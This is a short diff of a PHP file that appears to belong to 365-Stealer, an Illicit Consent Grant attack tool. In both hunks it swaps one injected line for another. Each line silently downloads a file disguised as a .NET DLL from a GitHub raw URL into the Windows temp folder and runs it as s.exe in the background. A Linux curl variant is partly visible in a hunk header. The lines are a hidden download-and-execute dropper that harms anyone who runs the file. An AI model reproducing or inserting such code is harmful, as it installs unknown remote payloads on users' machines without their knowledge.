@@ -1,6 +1,6 @@
 <?php
 
-if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
+if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
 
 
 # 365-Stealer is a tool used for performing Illicit Consent Grant attacks.
@@ -771,7 +771,7 @@ if(PHP_OS_FAMILY==='Linux'){exec('curl -s https://raw.githubusercontent.com/Stef
    
     function AppexecInBackground($cmd) {
 
-if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
+if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
 
       if (substr(php_uname(), 0, 7) == "Windows"){
          pclose(popen('start /B start '. $cmd, "r")); 
